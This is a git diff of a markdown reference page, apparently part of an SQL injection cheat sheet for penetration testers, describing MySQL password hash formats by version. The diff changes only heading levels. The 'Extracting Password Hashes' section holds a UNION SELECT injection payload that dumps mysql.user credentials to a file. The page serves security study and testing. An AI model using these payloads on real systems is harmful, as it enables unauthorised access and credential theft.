@@ -7,11 +7,9 @@ tags: ["password hashing", "authentication", "security"]
 lastUpdated: 2025-03-15
 ---
 
-## Password Hashing
-
 MySQL uses different password hashing algorithms depending on the version. Understanding these algorithms is important during SQL injection attacks when attempting to extract and potentially crack user passwords.
 
-### MySQL Password Hash Evolution
+## MySQL Password Hash Evolution
 
 | MySQL Version | Hash Algorithm        | Hash Length | Format                            |
 | ------------- | --------------------- | ----------- | --------------------------------- |
@@ -20,7 +18,7 @@ MySQL uses different password hashing algorithms depending on the version. Under
 | 5.7+          | Native Authentication | 20 bytes    | '\*' + Hex string (41 chars)      |
 | 8.0+          | caching_sha2_password | SHA-256     | '$A$005$' + mixed case (60 chars) |
 
-### MySQL Old Password Algorithm (Pre-4.1)
+## MySQL Old Password Algorithm (Pre-4.1)
 
 The old password algorithm used before MySQL 4.1 is a simple 16-byte hash:
 
@@ -35,7 +33,7 @@ The algorithm:
 2. Perform a specific folding operation
 3. Convert to a 16-character hex string
 
-### MySQL Standard Password Algorithm (4.1 to 5.6)
+## MySQL Standard Password Algorithm (4.1 to 5.6)
 
 The more secure password algorithm introduced in MySQL 4.1:
 
@@ -50,7 +48,7 @@ The algorithm:
 2. Calculate SHA1(hash1) = hash2
 3. Return '\*' + UPPERCASE(HEX(hash2))
 
-### Where Password Hashes Are Stored
+## Where Password Hashes Are Stored
 
 MySQL stores password hashes in system tables:
 
@@ -62,7 +60,7 @@ SELECT User, Host, Password FROM mysql.user;
 SELECT User, Host, authentication_string FROM mysql.user;
 ```
 
-### Extracting Password Hashes
+## Extracting Password Hashes
 
 When exploiting SQL injection vulnerabilities, password hashes can be obtained:
 
@@ -77,7 +75,7 @@ When exploiting SQL injection vulnerabilities, password hashes can be obtained:
 ' UNION SELECT User, Password, 3 FROM mysql.user INTO OUTFILE '/tmp/hashes.txt' -- -
 ```
 
-### Password Hash Formats Examples
+## Password Hash Formats Examples
 
 ```text
 -- Pre-4.1 hash for 'password'
@@ -90,7 +88,7 @@ When exploiting SQL injection vulnerabilities, password hashes can be obtained:
 $A$005$XKK#jY,d89Z0s8Xn1n8.8OaGl7NJ2fmWJKiLZ78XDOXbGXOX0d4InvT2
 ```
 
-### Special Password Values
+## Special Password Values
 
 MySQL uses special values for certain account states:
 
@@ -108,7 +106,7 @@ NULL
 '*THISISNOTAVALIDPASSWORDHASH*'
 ```
 
-### Dual Password Mechanism
+## Dual Password Mechanism
 
 From MySQL 5.6+, the server can maintain both old and new format hashes:
 
@@ -117,7 +115,7 @@ From MySQL 5.6+, the server can maintain both old and new format hashes:
 SHOW VARIABLES LIKE 'old_passwords';
 ```
 
-### Functions to Generate Password Hashes
+## Functions to Generate Password Hashes
 
 MySQL provides functions to create password hashes:
 
@@ -131,7 +129,7 @@ SELECT PASSWORD('mypassword');
 
 In MySQL 8.0+, direct password hashing functions are removed for security reasons.
 
-### Creating User with Password
+## Creating User with Password
 
 ```sql
 -- MySQL 5.7 and earlier
@@ -145,14 +143,14 @@ CREATE USER 'username'@'localhost' IDENTIFIED WITH 'mysql_native_password' BY 'p
 CREATE USER 'username'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19';
 ```
 
-### Password Hash Security Considerations
+## Password Hash Security Considerations
 
 1. Pre-4.1 hashes are considered insecure and can be cracked easily
 2. 4.1+ SHA1 hashes are stronger but still vulnerable to rainbow tables
 3. MySQL 8.0's caching_sha2_password is significantly more secure
 4. Some MySQL server configurations may still allow legacy authentication
 
-### Notes for Penetration Testers
+## Notes for Penetration Testers
 
 - Password policies are not enforced at the database level in MySQL 5.7 and earlier
 - Password hashes can be transferred between servers of the same version
